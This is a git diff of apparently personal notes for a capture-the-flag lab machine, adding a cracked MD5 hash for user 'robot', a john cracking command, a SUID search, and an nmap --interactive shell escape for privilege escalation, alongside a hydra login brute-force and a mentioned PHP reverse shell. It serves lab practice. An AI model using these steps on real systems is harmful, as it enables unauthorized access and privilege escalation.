@@ -2,7 +2,7 @@
 
 ## Preparation
 ```bash
-export IP="10.10.165.80"
+export IP="10.10.183.216"
 ```
 
 ## Port enumeration
@@ -48,9 +48,20 @@ sudo hydra -l Elliot -P downloads/fsocity.dic $IP http-post-form "/wp-login.php:
 # john <filename> --wordlist=<wordlist> --format=<hash format>
 
 # Determine the file hash type using hash-identifier
+robot:c3fcd3d76192e4007dfb496cca67e13b
+john --wordlist=/usr/share/wordlist/rockyou.txt --format=Raw-MD5 hash.txt
 
-john md5.hash --wordlist=downloads/fsocity.dic --format=Raw-MD5
+```
 
+## Find SUID binaries
+```bash
+find / -perm -u=s -type f 2> /dev/null
+```
+
+## Privilege escalation
+```bash
+nmap --interactive
+!sh
 ```
 
 # Comments
@@ -65,8 +76,13 @@ john md5.hash --wordlist=downloads/fsocity.dic --format=Raw-MD5
 -   create php revershell
     -   ready
 -   check home directories
+    -   found robot home directory
 -   crack password found using john
+    -   found password
 -   change shell to interactive using python
+    -   done
 -   change to another user using password found
+    -   done
 -   find SUID binaries
+
 -   privilege escalation using SUID enabled binaries
